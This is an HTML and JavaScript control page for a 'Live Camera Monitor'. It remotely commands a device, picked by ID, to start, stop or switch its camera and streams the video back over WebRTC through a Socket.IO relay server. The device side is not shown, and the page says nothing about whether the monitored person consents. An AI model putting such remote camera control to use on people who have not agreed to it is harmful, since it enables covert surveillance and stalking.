<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Camera Monitor</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
:root{
    --bg:#0f0f10;
    --panel:#1c1c1e;
    --green:#30d158;
    --red:#ff453a;
    --blue:#0a84ff;
}

body{
    margin:0;
    background:var(--bg);
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
    display:flex;
    justify-content:center;
    height:100vh;
    overflow:hidden; /* ‚úÖ SCROLL OFF */
}

.app{
    width:100%;
    max-width:480px;
    height:100vh;              /* ‚úÖ FULL SCREEN FIT */
    background:#000;
    display:flex;
    flex-direction:column;
}

/* HEADER */
.header{
    padding:14px 16px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    border-bottom:1px solid rgba(255,255,255,0.1);
    flex-shrink:0;
}

.status{
    font-size:12px;
    padding:5px 14px;
    border-radius:20px;
    background:var(--red);
    font-weight:700;
}

.status.live{
    background:var(--green);
    color:#000;
}

/* VIDEO */
.video-box{
    flex:1;                    /* ‚úÖ AUTO HEIGHT */
    background:black;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
}

video{
    width:100%;
    height:100%;
    object-fit:contain;
}

/* CONTROLS */
.controls{
    padding:14px;
    background:var(--panel);
    display:flex;
    gap:12px;
    flex-shrink:0;             /* ‚úÖ FIXED BOTTOM */
}

.btn{
    flex:1;
    border:none;
    border-radius:16px;
    padding:14px 0;
    font-size:15px;
    font-weight:700;
    color:white;
    cursor:pointer;
}

.start{ background:var(--green); color:#000; }
.stop{ background:var(--red); }
.switch{
    background:var(--blue);
    max-width:70px;
    font-size:18px;
}

/* üíª LAPTOP VIEW FIX */
@media (min-width: 900px){
    .app{
        height:95vh;
        margin-top:10px;
        border-radius:18px;
        overflow:hidden;
        border:1px solid rgba(255,255,255,0.15);
    }
}
</style>
</head>

<body>

<div class="app">

    <div class="header">
        <span>Live Camera</span>
        <span id="status" class="status">OFFLINE</span>
    </div>

    <div class="video-box">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <div class="controls">
        <button class="btn start" onclick="startCamera()">‚ñ∂ START</button>
        <button class="btn switch" onclick="switchCamera()">üîÑ</button>
        <button class="btn stop" onclick="stopCamera()">‚èπ STOP</button>
    </div>

</div>

<script>
/* ================= CONFIG ================= */

const SERVER = "https://child-v9no.onrender.com";

const params = new URLSearchParams(window.location.search);
let DEVICE_ID = params.get("id");

if(!DEVICE_ID){
    DEVICE_ID = localStorage.getItem("savedDeviceId");
}

if(!DEVICE_ID){
    alert("Device ID missing!");
}

/* ================= WEBRTC ================= */

let socket;
let pc;

const config = {
    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
};

/* ================= SOCKET ================= */

socket = io(SERVER);

socket.on("connect", ()=>{
    socket.emit("join-room","ADMIN");
});

/* ================= OFFER ================= */

socket.on("offer", async (data)=>{

    pc = new RTCPeerConnection(config);

    pc.ontrack = (event) => {
        const video = document.getElementById("remoteVideo");

        if (event.streams && event.streams[0]) {
            video.srcObject = event.streams[0];
        } else {
            const stream = new MediaStream();
            stream.addTrack(event.track);
            video.srcObject = stream;
        }

        video.play().catch(()=>{});
        setStatus(true);
    };

    pc.onicecandidate = (e)=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(
        new RTCSessionDescription({
            type: "offer",
            sdp: data.sdp
        })
    );

    const ans = await pc.createAnswer();
    await pc.setLocalDescription(ans);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: ans.sdp
    });
});

/* ================= ICE ================= */

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(new RTCIceCandidate({
            candidate: d.candidate,
            sdpMid: d.sdpMid,
            sdpMLineIndex: d.sdpMLineIndex
        }));
    }
});

/* ================= BUTTONS ================= */

function startCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "start_video"
    });
}

function stopCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "stop_video"
    });

    const v = document.getElementById("remoteVideo");
    v.srcObject = null;

    if(pc){
        pc.close();
        pc = null;
    }

    setStatus(false);
}

function switchCamera(){
    socket.emit("switch-camera",{ target: DEVICE_ID });
}

/* ================= UI ================= */

function setStatus(live){
    const s = document.getElementById("status");
    s.textContent = live ? "LIVE" : "OFFLINE";
    s.className = live ? "status live" : "status";
}
</script>

</body>
</html>
